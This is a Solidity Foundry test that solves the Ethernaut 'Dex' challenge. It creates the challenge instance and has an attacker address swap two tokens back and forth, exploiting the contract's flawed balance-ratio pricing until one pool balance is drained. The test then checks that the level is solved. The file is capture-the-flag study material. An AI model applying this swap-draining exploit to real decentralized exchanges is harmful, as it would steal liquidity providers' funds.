// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import "../src/Dex/Dex.sol";
import "../src/Dex/DexFactory.sol";
import "forge-std/console.sol";
import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

//ref https://stermi.medium.com/the-ethernaut-challenge-21-solution-dex-8d91bd0aed3

contract DexTest is Test {
    address _alice;

    function setUp() public {
        _alice = makeAddr("alice");
        vm.deal(_alice, 5 ether);
    }

    function testDex() public {
        DexFactory factory = new DexFactory();
        address instance = factory.createInstance(_alice);
        Dex dex = Dex(payable(instance));
        vm.startPrank(_alice);
        address token1 = dex.token1();
        address token2 = dex.token2();
        IERC20(token1).approve(address(dex), type(uint).max);
        IERC20(token2).approve(address(dex), type(uint).max);
        while (
            IERC20(token1).balanceOf(instance) != 0 &&
            IERC20(token2).balanceOf(instance) != 0
        ) {
            (token1, token2) = (token2, token1);
            uint input = IERC20(token1).balanceOf(_alice);
            uint output = dex.getSwapPrice(token1, token2, input);
            if (output > IERC20(token2).balanceOf(instance)) {
                input =
                    (IERC20(token1).balanceOf(instance) *
                        IERC20(token2).balanceOf(instance)) /
                    IERC20(token2).balanceOf(instance);
            }
            dex.swap(token1, token2, input);
        }
        vm.stopPrank();
        assertTrue(
            factory.validateInstance(payable(address(instance)), _alice),
            "invalid"
        );
    }
}
